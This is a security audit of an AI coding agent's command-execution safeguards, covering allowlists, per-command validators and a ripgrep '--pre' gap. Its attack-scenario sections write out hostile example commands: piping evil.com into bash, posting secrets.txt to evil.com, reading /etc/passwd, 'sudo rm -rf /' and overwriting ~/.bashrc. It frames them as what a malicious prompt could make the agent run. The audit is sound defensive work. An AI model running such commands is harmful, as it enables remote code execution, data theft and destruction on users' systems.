# Security Audit: Argument Injection Protection

**Date**: October 25, 2025  
**Focus**: Command execution argument injection vulnerabilities

## Executive Summary

VT Code implements a multi-layered security model for command execution:
1. **Execution Policy Allowlist** - Only explicitly allowed commands can run
2. **Per-Command Argument Validation** - Each command has custom validators
3. **Workspace Boundary Enforcement** - All paths must stay within workspace
4. **Sandbox Integration** - Network commands require Anthropic sandbox runtime

This audit evaluates the current implementation against known argument injection attack patterns.

## Current Security Posture

### ✅ Strong Defenses

1. **Strict Command Allowlist** (`vtcode-core/src/execpolicy/mod.rs`)
   - Only 9 commands allowed: `ls`, `cat`, `cp`, `head`, `printenv`, `pwd`, `rg`, `sed`, `which`
   - `git diff` explicitly blocked (redirected to dedicated tool)
   - All other commands rejected by default

2. **Argument Validation Per Command**
   - Each command has dedicated validator (e.g., `validate_rg`, `validate_sed`)
   - Explicit flag allowlists - unknown flags rejected
   - Path arguments validated for workspace containment
   - Symlink traversal protection

3. **Workspace Boundary Enforcement**
   - All paths normalized and validated against workspace root
   - Symlink resolution checks for escapes
   - Absolute paths rejected if outside workspace
   - Parent directory traversal (`../`) blocked when it escapes workspace

4. **Dangerous Command Blocking** (`bash_tool.rs`)
   - Blocks: `rm`, `sudo`, `chmod`, `docker`, `systemctl`, etc.
   - Network commands (`curl`, `wget`) require sandbox profile
   - System directory modifications blocked

### ⚠️ Areas Requiring Attention

#### 1. Ripgrep (`rg`) Execution Flags

**Risk Level**: HIGH

**Issue**: Ripgrep supports `--pre` and `--pre-glob` flags that execute arbitrary commands as preprocessors.

**Current State**: NOT BLOCKED

**Attack Vector**:
```rust
// Malicious prompt could generate:
rg --pre "bash -c 'curl evil.com | bash'" "pattern" .
```

**Recommendation**:
```rust
// In validate_rg(), add:
match current.as_str() {
    "--pre" | "--pre-glob" => {
        return Err(anyhow!("ripgrep preprocessor flags are not permitted"));
    }
    // ... existing cases
}
```

#### 2. Sed Execution Flags

**Risk Level**: MEDIUM (partially mitigated)

**Issue**: Sed supports `e` flag in substitution commands that executes replacement as shell command.

**Current State**: BLOCKED in `ensure_safe_sed_command()`

**Verification**: ✅ Code correctly blocks `e`, `E`, `F`, `f` flags

#### 3. Find Command Not in Allowlist

**Risk Level**: LOW (already mitigated)

**Issue**: `find` supports `-exec` flag for arbitrary command execution.

**Current State**: NOT IN ALLOWLIST - `find` is not in `execpolicy/mod.rs`

**Note**: `bash_tool.rs` has `execute_find()` but it's not accessible through the policy-enforced `CommandTool`

#### 4. Git Command Surface Area

**Risk Level**: MEDIUM

**Issue**: Git has many subcommands with execution capabilities:
- `git show --format` can write files
- `git config` can modify settings
- `git hook` can execute scripts

**Current State**: `git diff` explicitly blocked, but other git commands not in allowlist

**Recommendation**: Keep git out of allowlist. Use dedicated tools for specific git operations.

#### 5. Bash Tool Allowlist

**Risk Level**: MEDIUM

**Issue**: `bash_tool.rs` has its own allowlist separate from `execpolicy/mod.rs`:
- Includes compilers: `gcc`, `g++`, `clang`, `python`, `node`, etc.
- Includes build tools: `make`, `cargo`, `npm`, etc.

**Current State**: These commands bypass the strict execution policy

**Recommendation**: 
- Document that `bash_tool.rs` is for interactive use only
- Consider requiring explicit approval for compiler/build commands
- Add validation for dangerous compiler flags (e.g., `-o /etc/passwd`)

## Attack Scenarios Tested

### ✅ Blocked Attacks

1. **Shell Command Chaining**
   ```bash
   ls; curl evil.com | bash
   ```
   Status: BLOCKED - `;` not in allowlist, `curl` not in allowlist

2. **Path Traversal**
   ```bash
   cat ../../../etc/passwd
   ```
   Status: BLOCKED - Path validation rejects workspace escapes

3. **Symlink Escape**
   ```bash
   ln -s /etc/passwd link; cat link
   ```
   Status: BLOCKED - `ln` not in allowlist, symlink resolution checks escapes

4. **Privilege Escalation**
   ```bash
   sudo rm -rf /
   ```
   Status: BLOCKED - `sudo` explicitly blocked

5. **Network Exfiltration (without sandbox)**
   ```bash
   curl https://evil.com -d @secrets.txt
   ```
   Status: BLOCKED - `curl` requires sandbox profile

### ⚠️ Potential Attacks (Require Testing)

1. **Ripgrep Preprocessor**
   ```bash
   rg --pre "bash -c 'curl evil.com | bash'" "pattern" .
   ```
   Status: NEEDS TESTING - `--pre` flag not explicitly blocked

2. **Compiler Output Redirection**
   ```bash
   gcc malicious.c -o ~/.bashrc
   ```
   Status: NEEDS TESTING - Compiler flags not validated in `bash_tool.rs`

## Recommendations

### Immediate Actions (High Priority)

1. **Block Ripgrep Execution Flags**
   - Add `--pre` and `--pre-glob` to blocked flags in `validate_rg()`
   - Test with malicious preprocessor commands

2. **Audit Bash Tool Allowlist**
   - Review all commands in `bash_tool.rs` allowlist
   - Add argument validation for compilers and build tools
   - Consider requiring approval for potentially dangerous operations

3. **Add Suspicious Pattern Detection**
   - Detect chained tool calls that create then execute files
   - Flag unusual flag combinations (e.g., `git show --format --output`)
   - Log all command executions for security monitoring

### Medium-Term Improvements

1. **Strengthen Sandbox Integration**
   - Make sandbox mandatory for all command execution
   - Remove non-sandboxed fallback paths
   - Implement network allowlist in sandbox profile

2. **Add Command Execution Telemetry**
   - Log all command invocations with arguments
   - Track approval patterns (session vs permanent)
   - Alert on suspicious sequences

3. **Implement Argument Separator Pattern**
   - Use `--` separator before user input where possible
   - Example: `rg [flags] -- <pattern> <path>`
   - Prevents flag injection after pattern

### Long-Term Architecture

1. **Move to Facade Pattern**
   - Replace allowlist with dedicated tool handlers
   - Each handler validates specific command arguments
   - Centralized security policy enforcement

2. **Formal Security Testing**
   - Add fuzzing for command validators
   - Automated testing against GTFOBINS/LOLBINS
   - Regular security audits of new commands

3. **User Education**
   - Document security model in user-facing docs
   - Warn about risks of processing untrusted content
   - Provide guidance on safe workspace setup

## Testing Checklist

- [ ] Test ripgrep with `--pre` flag
- [ ] Test ripgrep with `--pre-glob` flag
- [ ] Test compiler output redirection
- [ ] Test build tool flag injection
- [ ] Verify sed execution flag blocking
- [ ] Test symlink escape scenarios
- [ ] Test absolute path handling
- [ ] Verify workspace boundary enforcement
- [ ] Test sandbox network restrictions
- [ ] Audit all bash_tool allowlist commands

## References

- [CWE-88: Argument Injection](https://cwe.mitre.org/data/definitions/88.html)
- [GTFOBINS](https://gtfobins.github.io/)
- [LOLBINS Project](https://lolbas-project.github.io/)
- Trail of Bits: Argument Injection in AI Agents (provided article)

## Conclusion

VT Code has a strong foundation for command execution security with its allowlist-based approach and per-command validation. The primary risks are:

1. **Ripgrep preprocessor flags** - Immediate fix required
2. **Bash tool allowlist** - Needs argument validation
3. **Compiler/build tool flags** - Potential for abuse

The execution policy model is sound, but requires ongoing vigilance as new commands are added. The sandbox integration provides an additional layer of defense that should be expanded.

**Overall Risk Assessment**: MEDIUM - Strong baseline with specific gaps requiring attention.
